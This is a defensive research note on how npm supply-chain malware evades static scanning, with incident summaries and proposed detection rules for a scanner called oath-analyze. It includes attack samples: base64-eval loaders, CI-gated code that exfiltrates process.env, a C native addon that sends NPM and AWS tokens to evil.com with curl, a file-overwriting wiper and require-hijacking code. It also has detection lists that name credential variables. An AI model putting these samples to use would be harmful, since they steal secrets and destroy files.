# npm Package Analysis Evasion: Technical Research for oath-analyze

> Dense technical reference. Real incidents, real patterns, concrete code.
> Written against oath-analyze's actual codebase (patterns.rs, analyzer.rs, scanner.rs, score.rs).

---

## 1. Known Evasion Techniques in Real Supply Chain Attacks

### 1.1 Base64 + eval() Chaining

The most common real-world pattern. The payload string is never visible as plaintext; static scanners that match `eval(` alone catch it, but those that only match the string being evaled miss it when the string is constructed at runtime.

```js
// Pattern A: immediate decode + exec
eval(Buffer.from('cmVxdWlyZSgnaHR0cHMnKS5nZXQo...','base64').toString());

// Pattern B: split across lines (defeats single-line regex)
const _0x = Buffer.from(
  'cmVxdWlyZSgnaHR0cHMnKS5nZXQo...',
  'base64'
);
eval(_0x.toString());

// Pattern C: atob (works in Node 16+ and browser context)
eval(atob('cmVxdWlyZSgnaHR0cHMnKS5nZXQo...'));

// Pattern D: chained .toString() on Buffer
(function(){eval(new Buffer('aGVsbG8=','base64').toString('utf8'))})();
```

**Real incidents using this:**
- `ua-parser-js` hijack (2021, 22M weekly downloads): postinstall script decoded a base64 blob to download a second-stage miner.
- `coa` and `rc` hijacks (Oct 2021, same day as ua-parser-js): identical postinstall base64 pattern, deployed in coordinated attack.
- `node-ipc` 2022 (protestware, ~1M/week): used `peacenotwar` as a side-loaded dependency that wrote files, no base64 but used dynamic require indirection.

**What oath currently detects:** `Buffer.from(` triggers `obfus-buffer-from` at Medium. `eval(` triggers `eval-direct` at High. **Gap: neither pattern cross-correlates the two**; a single `Buffer.from(...,'base64').toString()` fed to `eval()` should be Critical, not Medium+High independently.

---

### 1.2 Dynamic Property Access

Defeats string-literal matching. The property name is assembled at runtime so no static scan sees `AWS_SECRET` as a whole:

```js
// Pattern A: string concatenation
const key = process['env']['AWS' + '_SECRET' + '_ACCESS_KEY'];

// Pattern B: variable indirection
const parts = ['AWS', '_ACCESS', '_KEY_ID'];
const val = process.env[parts.join('')];

// Pattern C: computed member with template literal
const n = `AWS_${getSecretSuffix()}`;
process.env[n];

// Pattern D: bracket notation to avoid .env detection
const e = process['env'];
const token = e['NPM' + '_TOKEN'];
```

**Real incident:** `peacenotwar` (node-ipc 2022) used `process['env'].LANG` and `process['env'].TZ` specifically to pass basic string scans that only looked for `process.env.LANG`.

**What oath currently detects:** `process.env` (Info level) via both string scan and AST `visit_member_expression`. **Gap: bracket notation `process['env']` is NOT detected** -- the AST visitor only matches `StaticMemberExpression` (dot notation). Dynamic/computed member expressions are not walked.

---

### 1.3 Hex and Unicode String Obfuscation

```js
// Hex escape sequences (defeated by oath's hex_re density check, but threshold matters)
var _0x1a2b = '\x72\x65\x71\x75\x69\x72\x65'; // "require"
var _0x3c4d = _0x1a2b('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');

// Unicode escapes (NOT currently caught by oath -- only \x is checked)
var r = '\u0072\u0065\u0071\u0075\u0069\u0072\u0065'; // "require"

// Decimal char codes (most packer tools use this)
var s = String.fromCharCode(114,101,113,117,105,114,101); // "require"

// Mixed: partial obfuscation of key strings only
var _host = '\x31\x30\x2e\x31\x30\x2e\x31\x30\x2e\x35'; // "10.10.10.5"
```

**What oath currently detects:** `detect_obfuscation()` in scanner.rs checks hex density (>20% of string content = High), char code abuse (>10 instances = High). **Gap: unicode escapes `\uNNNN` are not checked at all.** The string_re in detect_obfuscation also doesn't handle backtick template literals.

---

### 1.4 Requiring Child Modules (Indirection)

The published package's index.js is completely clean. The malicious code lives in a deeply nested dependency, or in a file loaded via a computed path:

```js
// Pattern A: computed require path
const mod = require('./lib/' + process.platform);
// On linux: loads ./lib/linux.js which has the payload

// Pattern B: dependency chain
// package.json depends on "helper-utils": "1.0.0" which is the malicious pkg
// index.js just re-exports everything -- 100% clean
const helpers = require('helper-utils');
module.exports = helpers;

// Pattern C: dynamic require based on env
if (process.env.CI) {
  require('./lib/ci-helper'); // this file is the payload
}

// Pattern D: lazy load via require() inside function
module.exports = function setup(config) {
  const loader = require('./internal/loader'); // payload is here
  loader.init(config);
};
```

**Real incidents:**
- `event-stream` 2018 (flatmap-stream): the malicious `flatmap-stream` dependency was added to event-stream's deps. event-stream itself was clean; the crypto-stealing code was inside flatmap-stream, which decrypted its payload using the app's package.json name as a key.
- `colors.js` 2022 (Marak): no indirection, direct destructive code in index.js post-update. But many copycat attacks used the indirection technique.

**What oath currently detects:** Nothing for computed require paths or dependency-chain indirection. Oath does walk the dep tree (it's a package manager), so it does scan transitive deps -- but that scanning is independent of detecting the "clean outer / dirty inner" pattern.

---

### 1.5 Time-Delayed and Date-Gated Execution

```js
// Pattern A: setTimeout with long delay
setTimeout(() => {
  require('./payload').run();
}, 1000 * 60 * 60 * 24 * 7); // fires after 7 days -- after security scan window

// Pattern B: specific date check
const now = new Date();
if (now > new Date('2024-03-15') && now < new Date('2024-04-01')) {
  require('./exfil');
}

// Pattern C: install-time vs runtime check
const isInstall = process.env.npm_lifecycle_event === 'postinstall';
if (!isInstall) {
  setTimeout(stealCreds, 5000); // don't run during install (when scanners watch)
}

// Pattern D: version-gated (activates only in new version)
if (process.version.startsWith('v20')) {
  eval(payload);
}
```

**Real incident:** `SolarWinds-style staged payload` -- multiple npm malware campaigns in 2023-2024 (Lazarus Group / North Korean threat actors targeting cryptocurrency firms via fake job-offer packages) used date-window checks. The `xz-utils` attack (CVE-2024-3094) used 2-year patient waiting, not date checks, but shows the concept of deferred activation.

**What oath currently detects:** `eval-settimeout-string` catches `setTimeout("string")` but not `setTimeout(() => require(...), delay)`. **Gap: setTimeout/setInterval with function bodies are not flagged.**

---

### 1.6 Environment-Conditional Payloads (CI Targeting)

This is actually the most dangerous and most underdetected pattern. Malicious code only runs when it detects CI=true, because that's where AWS_SECRET_ACCESS_KEY, NPM_TOKEN, GITHUB_TOKEN are populated.

```js
// Pattern A: direct CI check
if (process.env.CI || process.env.GITHUB_ACTIONS || process.env.TRAVIS) {
  exfiltrateCredentials();
}

// Pattern B: negative condition (hides behind "only skip in CI" framing)
if (!process.env.CI) {
  return; // looks like "skip heavy ops in CI" -- actually inverse
}
doMaliciousThing();

// Pattern C: CI platform detection
const isCI = require('is-ci'); // legitimate package
const isGitHubActions = !!process.env.GITHUB_ACTIONS;
const isCircleCI = !!process.env.CIRCLECI;
if (isCI || isGitHubActions || isCircleCI) {
  const creds = {
    npm: process.env.NPM_TOKEN,
    aws: process.env.AWS_SECRET_ACCESS_KEY,
    gh: process.env.GITHUB_TOKEN,
  };
  // exfil via DNS or HTTPS
}

// Pattern D: disguised as telemetry
function sendAnalytics() {
  if (!process.env.CI) return;
  const data = Buffer.from(JSON.stringify(process.env)).toString('base64');
  require('https').get(`https://analytics.example.com/v1?d=${data}`);
}
```

**Real incidents:**
- `@ctx.io/logger` (2023): CI-conditional exfil of entire process.env to attacker server.
- Multiple `eslint-*` fake packages (2022-2023): used CI detection to steal tokens.

**What oath currently detects:** `conditional-payload` pattern matches `process.env.CI` ... wait, no -- looking at patterns.rs, it only matches `process.env.LANG`, `process.env.TZ`, geoip domains. **Gap: `process.env.CI`, `process.env.GITHUB_ACTIONS`, `TRAVIS`, `CIRCLECI` are completely missed.** The `env-sensitive` pattern doesn't include CI environment variables.

---

### 1.7 Native Addons (.node files / node-gyp)

Once C/C++ code is compiled and loaded via `require('binding.node')`, the JavaScript sandbox is completely bypassed. A native addon can:
- Call any syscall directly (no Node.js permission model applies)
- Open sockets
- Read/write any file
- Fork processes
- Load additional shared libraries (dlopen chains)
- Bypass oath-sandbox on both macOS (Seatbelt) and Linux (seccomp) unless the sandbox is enforced at the OS process level

```c
// binding.cc -- malicious native addon
#include <node.h>
#include <stdlib.h>
#include <string.h>

void Init(v8::Local<v8::Object> exports) {
  // "initialization" that actually exfiltrates
  const char* token = getenv("NPM_TOKEN");
  const char* aws = getenv("AWS_SECRET_ACCESS_KEY");
  if (token || aws) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
      "curl -s https://evil.com/c?t=%s&a=%s &",
      token ? token : "", aws ? aws : "");
    system(cmd);
  }
}
NODE_MODULE(binding, Init)
```

```json
// binding.gyp
{
  "targets": [{
    "target_name": "binding",
    "sources": ["src/binding.cc"],
    "conditions": [
      ["OS=='linux'", { "libraries": [] }]
    ]
  }]
}
```

**Real incident:**
- `better-sqlite3` has been a typosquatting target multiple times precisely because it uses native addons (legitimate use) which normalizes the pattern.
- `node_modules/.bin` injection via native addon has been documented by Snyk (2022).

---

### 1.8 Module Loader Patching (require() Hijacking)

```js
// Pattern A: Override Module._resolveFilename
const Module = require('module');
const originalResolve = Module._resolveFilename;
Module._resolveFilename = function(request, parent, isMain, options) {
  if (request === 'fs') {
    return originalResolve('fs-malicious', parent, isMain, options);
  }
  return originalResolve(request, parent, isMain, options);
};

// Pattern B: Monkey-patch require itself
const originalRequire = Module.prototype.require;
Module.prototype.require = function(id) {
  const result = originalRequire.call(this, id);
  if (id === 'child_process') {
    // intercept all child_process.exec calls from any module
    const origExec = result.exec;
    result.exec = function(cmd, ...args) {
      exfil(cmd); // capture all commands being executed
      return origExec.call(result, cmd, ...args);
    };
  }
  return result;
};

// Pattern C: preloaded via NODE_OPTIONS
// In postinstall script:
// NODE_OPTIONS="--require /path/to/hook.js" npm install something
```

**What oath currently detects:** `require('module')` is not flagged. `Module._resolveFilename` is not flagged. **Gap: entire require-hijacking class is undetected.**

---

### 1.9 Real Incident Deep-Dives

#### colors.js (Marak, Jan 2022)
- **Technique:** Direct sabotage, no obfuscation. Version 1.4.44-liberty-2 added an infinite loop (`while(true){}`) to `lib/extendStringPrototype.js` and a banner printing nonsense to stdout.
- **Detection difficulty:** LOW -- obvious infinite loop in source. Any code reviewer would catch it. The real lesson: **version monitoring matters more than pattern matching here**. The new version did something the old version never did.
- **oath implication:** Version-over-version behavioral diff (new capability in new version) is a signal oath doesn't currently compute.

#### node-ipc / peacenotwar (Brandon Nozaki Miller, Feb-Mar 2022)
- **Technique:** Version 10.1.1+ added a dependency on `peacenotwar` (his own package). `peacenotwar` used:
  ```js
  // Used Intl.DateTimeFormat to detect Russian/Belarusian timezones
  const isRU = new Intl.DateTimeFormat().resolvedOptions().timeZone.includes('Europe/');
  if (isRU) {
    // Recursively overwrote files in ~/Desktop and ~/Documents with a peace message
    const fs = require('fs');
    const path = require('path');
    function wipeDir(dir) {
      fs.readdirSync(dir).forEach(f => {
        const full = path.join(dir, f);
        if (fs.lstatSync(full).isDirectory()) wipeDir(full);
        else fs.writeFileSync(full, '\u262E'); // peace symbol
      });
    }
  }
  ```
- **Detection:** oath's `conditional-payload` pattern catches `Intl.DateTimeFormat` -- DETECTED. Also `fs-write-home` would catch the home directory access.

#### xz-utils (CVE-2024-3094, Apr 2024)
- **Language:** C, not JS, but technique applies directly to native npm addons.
- **Technique:** 2+ year patient contribution history. Malicious code was in binary test files (`.xz` archives) committed to the repo. A build-time script extracted and patched the source. The injected code hooked OpenSSH's RSA key authentication to allow backdoor access using a hardcoded key.
- **Key evasion:** Malicious code was NOT in `.c` files -- it was hidden in binary test data decoded at build time. Static analysis of source files would miss it entirely.
- **oath implication for native addons:** Scanning C source is necessary but not sufficient. Must also check for binary files in src/ that get decoded/extracted during build, and unusual `configure.ac` / `Makefile.am` patterns.

---

## 2. What Existing Tools Do

### 2.1 socket.dev

Socket.dev is the most sophisticated npm security tool. Their approach:

**Signals they use (from their published threat model):**
1. **Install scripts:** Any preinstall/postinstall/install is flagged, user must explicitly allow.
2. **Network access:** Any HTTP/HTTPS calls from package code, especially in install scripts.
3. **Shell access:** Any child_process or shelljs usage.
4. **Dynamic eval:** eval(), Function(), vm module usage.
5. **Obfuscation detection:** Entropy-based (Shannon entropy on strings), hex/base64 density, minification detection. They use a trained ML model here.
6. **Typosquatting:** Edit-distance + phonetic similarity against their known-popular package list.
7. **Protestware detection:** Locale/timezone/IP checks for conditional payload patterns.
8. **Dependency confusion:** Scoped vs unscoped package name conflicts.
9. **Maintainer analysis:** New maintainer on old package, abandoned package (no activity >2 years), email/GitHub account recently created.
10. **License changes:** MIT -> proprietary signals monetization attacks.
11. **AI/LLM-hallucinated package names (slopsquatting):** They scan for common LLM-confabulated names.

**ML model signals (inferred from Socket blog posts):**
- They train on known-malicious packages from npm's security disclosures
- Features: AST feature vectors (call types, import patterns), string entropy distributions, code density metrics, dependency graph topology
- They do NOT run packages -- it's entirely static + metadata
- False positive rate management: they whitelist known-safe packages and suppress certain categories for dev dependencies

**What socket catches that oath doesn't yet:**
- Maintainer account health (requires registry API calls)
- Version-over-version diff (new capabilities in new version)
- Dependency graph topology analysis (sudden new deps)
- Broad "new CI env var reads" detection

### 2.2 Snyk

Snyk is primarily **CVE-based**, not behavioral. Their model:

1. **CVE database:** They maintain their own vuln DB (Snyk Vulnerability DB), faster updates than NVD for npm.
2. **License compliance:** LGPL/GPL in prod deps.
3. **Reachability analysis:** They do (limited) call graph analysis to determine if a vulnerable function is actually called by your code. This is genuinely impressive but only applies to known CVEs, not unknown malware.
4. **Code quality:** Some SAST rules via Snyk Code (powered by DeepCode/AI), but these are security antipatterns (injection, XSS), not supply-chain malware.

**What Snyk does NOT do well:**
- Zero-day malware detection (no known CVE = not flagged)
- Behavioral analysis of install scripts
- Obfuscation detection
- Supply chain attack patterns

**Implication for oath:** Snyk and oath are complementary. Snyk is CVE coverage; oath is behavioral/supply-chain.

### 2.3 GuardDog (Datadog, open source)

GuardDog is the most directly comparable open-source tool to oath-analyze. Their patterns (from the GitHub repo):

**Exact patterns GuardDog checks:**
```python
# From guarddog/analyzer/metadata/
- abandoned_package: last release > 2 years ago
- empty_information: no description or author
- potentially_compromised_email: maintainer email domain expired (can be re-registered)
- release_zero: version 0.0.X (immature, possibly test)

# From guarddog/analyzer/sourcecode/
- cmd_overwrite: overwrites PATH or env vars
- download_executable: downloads binary and makes it executable  
- dynamic_code_execution: eval, Function constructor
- exfiltrate_sensitive_data: env var access + network
- obfuscated_code: high entropy, hex encoding
- npm_install: calls npm inside postinstall
- npm_script: unusual lifecycle scripts
- shady_links: URLs to known-bad TLDs or IP addresses
- silent_process_execution: spawns processes with stdout/stderr suppressed
```

**Key GuardDog patterns oath should adopt:**
1. `cmd_overwrite`: Checks for code that sets `process.env.PATH` -- this can redirect executables to malicious binaries.
2. `download_executable`: Checks for `chmod +x` or `fs.chmodSync` after a download.
3. `silent_process_execution`: `{ stdio: 'ignore' }` or `{ stdio: ['pipe','ignore','ignore'] }` in exec/spawn options -- legitimate tools show output, malware hides it.

### 2.4 Semgrep Rules for npm Malware

The semgrep-rules repository has a `javascript/supply-chain/` collection:

```yaml
# semgrep rule: detect base64 eval chain
rules:
  - id: eval-base64-decoded
    patterns:
      - pattern: eval(Buffer.from($X, 'base64').toString())
      - pattern: eval(atob($X))
    message: eval() of base64-decoded string is a common malware pattern
    severity: ERROR

  - id: dynamic-property-access-env
    pattern: process[$ENV_KEY]
    message: Dynamic property access on process object bypasses env name detection
    severity: WARNING

  - id: require-computed-path
    pattern: require($VAR + $SUFFIX)
    message: Computed require() path may load malicious modules
    severity: WARNING

  - id: chmod-after-download
    patterns:
      - pattern: |
          $RESPONSE = await fetch($URL);
          ...
          fs.chmodSync($PATH, ...)
    message: Making a downloaded file executable is a high-risk pattern
    severity: ERROR
```

The semgrep rules miss multi-file flows (env read in file A, HTTP send in file B) and obviously can't detect obfuscation that's been intentionally designed to evade them.

---

## 3. What oath Can Realistically Detect with AST Analysis

### 3.1 Statically Detectable (High Confidence)

| Pattern | Technique | FP Rate | oath Status |
|---------|-----------|---------|-------------|
| eval(Buffer.from(...,'base64')) | AST: detect eval wrapping Buffer.from with 'base64' arg | Low | PARTIAL (both detected separately, not combined) |
| eval(atob(...)) | String match + AST | Low | PARTIAL (atob detected, not combo) |
| String.fromCharCode array | Density check | Medium | DETECTED (>10 instances) |
| \x hex density | Regex density | Low-Med | DETECTED (>20% threshold) |
| process['env'] bracket notation | AST: ComputedMemberExpression | Low | NOT DETECTED |
| new Function(...) | String + AST | Low | DETECTED |
| vm.runInNewContext | String match | Low | DETECTED |
| fetch + process.env in same call | AST: check_exfil_combo | Medium | DETECTED (same span only) |
| Intl.DateTimeFormat timezone check | String match | Medium | DETECTED (conditional-payload) |
| IP geolocation API calls | String match | Low | DETECTED (ipapi.co etc.) |
| exec with {stdio:'ignore'} | AST: check spawn options | Low | NOT DETECTED |
| PATH env overwrite | AST: process.env.PATH assignment | Low | NOT DETECTED |
| chmod after fetch/download | Cross-statement AST | Medium | NOT DETECTED |
| download to /tmp then require | String match + AST | Low | PARTIALLY DETECTED (/tmp/ match) |
| module require patching | AST: Module._resolveFilename | Low | NOT DETECTED |
| \uNNNN unicode density | Regex density | Low | NOT DETECTED |
| base64 in template literal | AST: TemplateLiteral + Buffer.from | Low | MISSED |
| process.env.CI conditional | String match | Low | NOT DETECTED |
| silent exec {stdio:'ignore'} | AST option object analysis | Low | NOT DETECTED |

### 3.2 Requires Dynamic Analysis (Cannot Detect Statically)

These patterns fundamentally require running the code:

1. **Computed require paths**: `require('./lib/' + platform)` -- you can't know what `platform` resolves to without running it.
2. **Encrypted payloads**: `flatmap-stream` encrypted its payload using the consuming app's package name as the key. No static analysis can decrypt this.
3. **Network-fetched second stage**: The payload is a URL. The URL's content could be anything. oath could flag the pattern of "fetch then eval" but can't know what's being fetched.
4. **Time-locked code**: A `setTimeout(() => ..., 7_days_ms)` with a closure over local variables -- you'd need to run it and wait.
5. **Prototype pollution chains**: The malicious behavior emerges from subtle mutations to `Object.prototype` that affect other packages.
6. **Polyglot files**: A `.js` file that is also a valid `.zip` archive (or vice versa). Static JS analysis doesn't see the zip content.

### 3.3 The FP/Detection Tradeoff

```
Pattern Specificity vs. False Positive Risk:

VERY SPECIFIC (low FP, may miss variants):
  eval(Buffer.from('...','base64').toString())  <- exact combo, near zero FP
  .execSync( combined with hardcoded IP        <- very suspicious, low FP

SPECIFIC (low-medium FP):
  Buffer.from + eval in same function scope    <- needs AST scope tracking
  fetch() with process.env in POST body        <- oath already checks this
  setTimeout with anonymous fn calling require  <- medium FP (legitimate lazy load)

MODERATE SPECIFICITY (medium FP):
  Any eval()                                   <- jinja templates, template engines use eval
  Buffer.from(..., 'base64')                   <- extremely common in real code
  process.env reads                            <- 100% of real packages do this

BROAD (high FP):
  Any network access                           <- 70%+ of packages are legitimate
  Any fs access                                <- build tools, config loaders
  Any subprocess                               <- test runners, build tools

RECOMMENDATION: Use COMBINATION scoring.
  Single signal = at most Medium
  Two related signals in same file = High
  Three related signals or known-malicious combo = Critical
```

**The base case for oath:** oath's current design of independent pattern matching with additive scoring is correct. The improvement is recognizing *combinations* as fundamentally more suspicious than the sum of their parts. `eval` is High. `Buffer.from(...,'base64')` is Medium. Together in the same statement = Critical. This is what the `check_exfil_combo` function in analyzer.rs starts to do -- but it only checks a small slice of the combo space.

---

## 4. Native Addons Specifically

### 4.1 How .node Files Work

A `.node` file is a standard shared library (`.so` on Linux, `.dylib` on macOS, `.dll` on Windows) with a specific export: `napi_register_module_v1` or `node_register_module_v<N>`. When Node.js executes `require('./build/Release/binding.node')`, it calls `dlopen()` on the file and calls this export to initialize the module.

**Security implications:**
1. Once `dlopen()` is called, the native code runs with the **full process privileges** of the Node.js process.
2. There is no V8 sandbox, no Node.js permission model, no oath-sandbox policy enforcement at the JS layer.
3. The native code can call `ptrace()`, `mmap()`, open `/etc/shadow`, connect to sockets -- anything the OS permits the user to do.
4. `oath-sandbox` on macOS uses `sandbox_init()` (Seatbelt). Seatbelt DOES apply to native addon syscalls -- it's a kernel-level policy, not a JS-level one. But oath-sandbox would need to be active during install-time script execution, and the native code might be loaded AFTER sandbox policy is applied.

### 4.2 Can We Scan C Source Before Compilation?

**Yes, partially.** When a package has `binding.gyp` in its root, the C/C++ source (typically in `src/`) is present and can be scanned. This is feasible because:
- Most malicious native addons are simple (they just call `system()` or `getenv()` + socket)
- Dangerous libc calls are fairly enumerable

**C source patterns worth scanning:**

```c
// HIGH RISK: direct command execution
system(cmd);
popen(cmd, "r");
execve(path, argv, envp);
execvp(path, argv);
execlp(path, path, arg1, NULL);

// HIGH RISK: environment variable access
getenv("AWS_SECRET_ACCESS_KEY");
getenv("NPM_TOKEN");
getenv("GITHUB_TOKEN");
environ; // direct access to all env vars

// HIGH RISK: network sockets (beyond what binding should need)
socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd, addr, addrlen);

// MEDIUM RISK: file access to sensitive paths
fopen("/etc/passwd", "r");
// Or path construction with HOME/.ssh/.aws
strcat(path, "/.ssh/id_rsa");

// SUSPICIOUS: dlopen inside the addon (loading another library)
dlopen(lib_path, RTLD_LAZY);

// SUSPICIOUS: fork/exec combo
if (fork() == 0) { execv(...); }
```

**Limitations:** C scanning is harder than JS scanning because:
- Preprocessor macros can obfuscate (`#define EXEC system`)
- Inline assembly can bypass function-level analysis
- xz-utils style attacks put the payload in binary test data decoded at build time -- no C source to scan
- Build scripts (`configure.ac`, `Makefile.am`, CMakeLists.txt) can themselves be malicious

**Recommendation:** Scan C/C++ source in packages with `binding.gyp` as a SEPARATE analysis pass. Flag at High for `system()` calls, Critical for `system()` + `getenv("TOKEN")`-type combos.

### 4.3 Should oath Require Explicit Opt-in for Native Addons?

**Yes. This is the right design.** Here's the rationale and policy design:

```
POLICY RECOMMENDATION for oath:
  
  native_addon_policy = "require-approval" | "allow" | "block"
  
  Default: "require-approval"
  
  When a package builds a native addon (has binding.gyp or prebuilds .node files):
  1. Flag in analysis report as FindingKind::NativeAddon, RiskLevel::High
  2. In interactive mode (oath install): prompt user
     "Package X builds a native addon (C/C++ code with full system access).
      Native addons bypass JavaScript sandboxing entirely.
      [ Allow once ] [ Allow for this project ] [ Block ]"
  3. In non-interactive/CI mode: block by default unless oath.toml has
     [packages."package-name"]
     allow_native_addon = true
```

**Legitimate native addon packages:**
- `sharp`: libvips image processing (justified -- performance-critical)
- `better-sqlite3`: SQLite bindings (justified -- needs C library)
- `canvas`: Cairo/Pango for Node.js (justified)
- `node-gyp`, `node-pre-gyp`: build tooling (self-referential, justified)
- `bcrypt`: password hashing (has a JS fallback but C is faster)
- `fsevents`: macOS filesystem event monitoring (macOS-specific API)
- `cpu-features`: CPU detection (read-only, low risk)
- `@tensorflow/tfjs-node`: TF native bindings (justified, very large)
- `node-sass` (deprecated), `sass`: C++ Sass compiler

**Red flags that distinguish malicious from legitimate:**
- Very small package (few lines of JS) + native addon (why do you need C for this?)
- Native addon that calls `system()` or `getenv()` for token-like strings
- No pre-built binaries distributed (must compile from source) + suspicious C source
- Package is new (< 30 days) + native addon
- Binding source doesn't match the package's stated purpose

### 4.4 Detecting Native Addon Presence

In scanner.rs, oath should add native addon detection:

```rust
// In PackageScanner::scan(), after package.json check:

// Check for native addon indicators
let has_binding_gyp = package_dir.join("binding.gyp").exists();
let has_gyp_file = WalkDir::new(package_dir)
    .max_depth(2)
    .into_iter()
    .filter_map(|e| e.ok())
    .any(|e| e.path().extension().map(|x| x == "gyp").unwrap_or(false));
let has_node_file = WalkDir::new(package_dir)
    .into_iter()
    .filter_map(|e| e.ok())
    .any(|e| e.path().extension().map(|x| x == "node").unwrap_or(false));
let has_cc_source = WalkDir::new(package_dir)
    .into_iter()
    .filter_map(|e| e.ok())
    .any(|e| {
        let ext = e.path().extension().and_then(|x| x.to_str()).unwrap_or("");
        matches!(ext, "cc" | "cpp" | "c" | "h" | "hpp")
    });

if has_binding_gyp || has_gyp_file || (has_node_file && has_cc_source) {
    all_findings.push(Finding {
        kind: FindingKind::NativeAddon,
        risk: RiskLevel::High,
        message: "Package builds or includes a native addon (.node / binding.gyp)".into(),
        file: "package root".into(),
        line: 0,
        snippet: None,
    });
}
```

---

## 5. Concrete Improvements for oath-analyze

### Pattern 1: process['env'] Bracket Notation (CRITICAL GAP)

**Risk: High**

```rust
// In AstVisitor::visit_member_expression, add computed member handling:
if let MemberExpression::ComputedMemberExpression(m) = it {
    if let Expression::Identifier(obj) = &m.object {
        if obj.name == "process" {
            let line = self.offset_to_line(m.span.start);
            let snippet = self.line_snippet(m.span.start);
            self.push(FindingKind::EnvAccess, RiskLevel::Medium,
                "Computed property access on process (process['env'] evasion pattern)",
                line, &snippet);
        }
    }
}
```

Also add string patterns:
```rust
Pattern {
    id: "env-bracket-notation",
    kind: FindingKind::EnvAccess,
    risk: RiskLevel::Medium,
    description: "Computed property access on process object (evasion of env detection)",
    strings: &["process['env']", "process[\"env\"]"],
},
```

### Pattern 2: Base64+eval Combination Detection (UPGRADE existing)

Currently oath detects these separately. Upgrade to recognize the combo as Critical:

```rust
// In AstVisitor::visit_call_expression, when we see eval():
if id.name == "eval" {
    let line = self.offset_to_line(start);
    let snippet = self.line_snippet(start);
    
    // Check if argument contains Buffer.from or atob
    let arg_slice = {
        let end = (start + 200).min(self.source.len() as u32);
        &self.source[start as usize..end as usize]
    };
    
    let is_encoded = arg_slice.contains("Buffer.from")
        || arg_slice.contains("atob(")
        || arg_slice.contains("btoa(")
        || arg_slice.contains(".toString('base64')")
        || arg_slice.contains(".toString(\"base64\")");
    
    let (risk, msg) = if is_encoded {
        (RiskLevel::Critical, 
         "eval() of base64/encoded string -- classic malware obfuscation (CRITICAL)")
    } else {
        (RiskLevel::High, "Direct eval() -- dynamic code execution")
    };
    
    self.push(FindingKind::DynamicExec, risk, msg, line, &snippet);
}
```

Add a new High-risk string pattern for the combo:
```rust
Pattern {
    id: "eval-base64-combo",
    kind: FindingKind::DynamicExec,
    risk: RiskLevel::Critical,
    description: "eval() of base64-decoded string (definitive malware pattern)",
    strings: &[
        "eval(Buffer.from(",
        "eval(atob(",
        "eval(new Buffer(",
        "Function(Buffer.from(",
        "Function(atob(",
        "(Buffer.from(", // catches variable assignment then eval
    ],
},
```

### Pattern 3: CI Environment Targeting

**Risk: High** -- this is almost exclusively malicious when combined with exfil

```rust
Pattern {
    id: "env-ci-targeting",
    kind: FindingKind::ConditionalPayload,
    risk: RiskLevel::High,
    description: "Code gates behavior on CI environment variables (credential theft vector)",
    strings: &[
        "process.env.CI",
        "process.env.GITHUB_ACTIONS",
        "process.env.TRAVIS",
        "process.env.CIRCLECI",
        "process.env.JENKINS_URL",
        "process.env.GITLAB_CI",
        "process.env.BUILDKITE",
        "process.env.DRONE",
        "process.env.TF_BUILD",     // Azure Pipelines
        "process.env.CI_NAME",
    ],
},
```

Add to `env-sensitive` pattern's strings:
```rust
"ACTIONS_RUNTIME_TOKEN",
"ACTIONS_ID_TOKEN_REQUEST_TOKEN",
"CI_JOB_TOKEN",           // GitLab
"CIRCLE_TOKEN",
"TRAVIS_API_TOKEN",
```

### Pattern 4: Silent Process Execution (GuardDog-inspired)

**Risk: High** -- legitimate tools don't suppress all output

```rust
Pattern {
    id: "subprocess-silent",
    kind: FindingKind::Subprocess,
    risk: RiskLevel::High,
    description: "Process spawned with all stdio suppressed (malware hides output)",
    strings: &[
        "stdio: 'ignore'",
        "stdio: \"ignore\"",
        "stdio:['pipe','ignore','ignore']",
        "stdio: ['ignore', 'ignore', 'ignore']",
        "'stdio':'ignore'",
    ],
},
```

AST enhancement in visit_call_expression:
```rust
// When we see spawn/exec/execSync, check options object for stdio: 'ignore'
// This requires walking the arguments of the call:
if prop == "exec" || prop == "execSync" || prop == "spawn" || prop == "spawnSync" {
    let arg_slice = &self.source[start as usize..(start+300).min(self.source.len() as u32) as usize];
    if arg_slice.contains("ignore") && arg_slice.contains("stdio") {
        self.push(FindingKind::Subprocess, RiskLevel::High,
            "Process spawned with suppressed stdio (malware evasion pattern)",
            line, &snippet);
    }
}
```

### Pattern 5: PATH / Shell Environment Overwrite

**Risk: High**

```rust
Pattern {
    id: "env-path-overwrite",
    kind: FindingKind::Subprocess,
    risk: RiskLevel::High,
    description: "Overwrites PATH or shell environment (can redirect to malicious executables)",
    strings: &[
        "process.env.PATH =",
        "process.env['PATH'] =",
        "process.env[\"PATH\"] =",
        "env.PATH =",
        "PATH=\"/",        // shell script style in exec strings
        "export PATH=",
    ],
},
```

### Pattern 6: Download + Execute Pattern (chmod after fetch)

**Risk: Critical**

```rust
Pattern {
    id: "download-execute",
    kind: FindingKind::DynamicExec,
    risk: RiskLevel::Critical,
    description: "Downloads binary and makes it executable (dropper pattern)",
    strings: &[
        "chmodSync",
        "chmod +x",
        "fs.chmod(",
        "fs.chmodSync(",
        "0o755",   // executable permission in octal
        "0755",    // executable permission
        "0o777",
        "0777",
    ],
},
```

Upgrade to Critical when combined with network in same file (new combo check in PackageScanner):

```rust
// Post-scan combination check in PackageScanner::scan():
let has_chmod = all_findings.iter().any(|f| f.snippet.as_deref()
    .map(|s| s.contains("chmod") || s.contains("0755") || s.contains("0o755"))
    .unwrap_or(false));
let has_network = capabilities.network;
if has_chmod && has_network {
    all_findings.push(Finding {
        kind: FindingKind::DynamicExec,
        risk: RiskLevel::Critical,
        message: "Network access combined with chmod: dropper/downloader pattern".into(),
        file: "package (multi-file)".into(),
        line: 0,
        snippet: None,
    });
}
```

### Pattern 7: require() of Module System + _resolveFilename

**Risk: High**

```rust
Pattern {
    id: "module-loader-patch",
    kind: FindingKind::DynamicExec,
    risk: RiskLevel::High,
    description: "Patches Node.js module loader (require hijacking)",
    strings: &[
        "Module._resolveFilename",
        "Module.prototype.require",
        "require.extensions",
        "require.cache",
        "Module._load",
        "Module._extensions",
        "require('module')",
        "require(\"module\")",
        "node:module",
    ],
},
```

Note: `require.cache` has legitimate uses (cache invalidation in hot reload) and `require('module')` is used by bundlers. Score as Medium for isolated occurrence, High when combined with reassignment (the `=` after).

### Pattern 8: Unicode Escape Density (MISSING FROM CURRENT SCANNER)

```rust
// In detect_obfuscation() in scanner.rs, add after the hex_re check:

let unicode_re = Regex::new(r"\\u[0-9a-fA-F]{4}").unwrap();
